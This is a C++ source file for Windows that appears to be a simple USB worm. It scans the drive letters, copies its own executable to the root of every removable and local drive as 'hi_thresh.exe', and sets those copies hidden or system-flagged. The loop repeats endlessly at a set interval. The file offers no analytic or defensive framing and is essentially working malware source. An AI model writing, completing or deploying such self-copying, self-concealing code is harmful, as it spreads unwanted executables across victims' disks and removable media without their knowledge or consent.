
#include <windows.h>
#include <iostream>
#include "func.h"


void scan()
{	
	DWORD dw;
    TCHAR TC[50];
    dw = GetLogicalDrives();

	for(int i = 0 ; i <maxlen;i++ )
		
		table[i].type = 0; 
		    
    
	for(int i = 0 ; i <maxlen;i++ )
	{
		table[i].name = 'C'+i;
		if( (dw != 0) && (dw >> (i+2)) != 0 )
		{
			table[i].existence = true; 		
			char hostaddress[5] = "C:\\";
			hostaddress[0] +=i;
			unsigned int type = GetDriveType( hostaddress );	
			table[i].type=type;

		}
		else table[i].existence = false;
		
		//std::cout<<table[i].name<<"  "<<table[i].existence<<"  "<<table[i].type<<'\n';
	}
	return;
}

void copy()
{
char *szPath = new char[100];
GetModuleFileName(NULL,szPath,100);
std::cout<<szPath;
for(int i = 0 ; i<maxlen ; i ++)
{
	if(table[i].type==portable_path || table[i].type == Local_disk)
	{
		char tmp[20] = "C:\\hi_thresh.exe";
		tmp[0] +=i;
		char *d = tmp;
		CopyFile(szPath,d,FALSE);
		if(table[i].type==portable_path)
			SetFileAttributes(d,FILE_ATTRIBUTE_HIDDEN);
		else if (table[i].type==Local_disk)
			SetFileAttributes(d,FILE_ATTRIBUTE_SYSTEM);
	}
}
	return;
}


void* rua(void* args)
{
	while(true)
{
	scan();
	copy();
	Sleep(timeinterval);//Low payload
}	return 0;
}

void* greeting(void* args)
{
	printf("Hello thresh!");
}
